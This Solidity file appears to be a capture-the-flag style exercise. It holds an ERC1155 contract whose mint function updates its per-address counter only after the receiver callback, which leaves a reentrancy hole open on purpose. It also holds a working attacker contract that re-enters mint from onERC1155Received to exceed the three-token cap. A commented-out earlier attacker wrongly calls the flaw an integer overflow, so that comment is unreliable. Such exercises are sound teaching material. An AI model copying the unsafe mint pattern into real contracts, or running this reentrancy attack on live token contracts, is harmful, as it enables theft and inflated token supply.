// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC1155/ERC1155.sol";
import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol";
import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";
import "hardhat/console.sol";

contract Overmint1_ERC1155 is ERC1155 {
    using Address for address;
    mapping(address => mapping(uint256 => uint256)) public amountMinted;
    mapping(uint256 => uint256) public totalSupply;

    constructor() ERC1155("Overmint1_ERC1155") {}

    function mint(uint256 id, bytes calldata data) external {
        require(amountMinted[msg.sender][id] <= 3, "max 3 NFTs");
        totalSupply[id]++;
        _mint(msg.sender, id, 1, data);
        amountMinted[msg.sender][id]++;
    }

    function success(
        address _attacker,
        uint256 id
    ) external view returns (bool) {
        return balanceOf(_attacker, id) == 5;
    }
}

// contract Overmint1_ERC1155_Attacker {
//     Overmint1_ERC1155 public targetContract;
//     uint256 public tokenId;

//     constructor(address _targetContract, uint256 _tokenId) {
//         targetContract = Overmint1_ERC1155(_targetContract);
//         tokenId = _tokenId;
//     }

//     function attack() external {
//         // Mint 3 NFTs, reaching the intended limit
//         for (uint256 i = 0; i < 3; i++) {
//             targetContract.mint(tokenId, "");
//         }

//         // Exploit the integer overflow, resetting amountMinted[msg.sender][tokenId] to 0
//         targetContract.mint(tokenId, "");

//         // Mint additional NFTs beyond the intended limit
//         for (uint256 i = 0; i < 4; i++) {
//             targetContract.mint(tokenId, "");
//         }
//     }
// }

contract Overmint1_ERC1155_Attacker is ERC1155Receiver {
    Overmint1_ERC1155 immutable target;
    uint256 constant TOKENID = 0;

    constructor(address _target) {
        target = Overmint1_ERC1155(_target);
    }

    function attack() external {
        console.log("Attack Started");
        target.mint(TOKENID, "");
        console.log("are we done?:", target.success(address(this), TOKENID));
        console.log(
            "Finished attack, now send tokens to attacker address - safeTransferFrom"
        );
        target.safeTransferFrom(address(this), msg.sender, TOKENID, 5, "");
    }

    function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        while (target.success(address(this), TOKENID) == false) {
            console.log(
                "are we done?:",
                target.success(address(this), TOKENID)
            );
            target.mint(TOKENID, "");
        }

        return this.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(
        address,
        address,
        uint256[] calldata,
        uint256[] calldata,
        bytes calldata
    ) external pure override returns (bytes4) {
        return this.onERC1155BatchReceived.selector;
    }
}
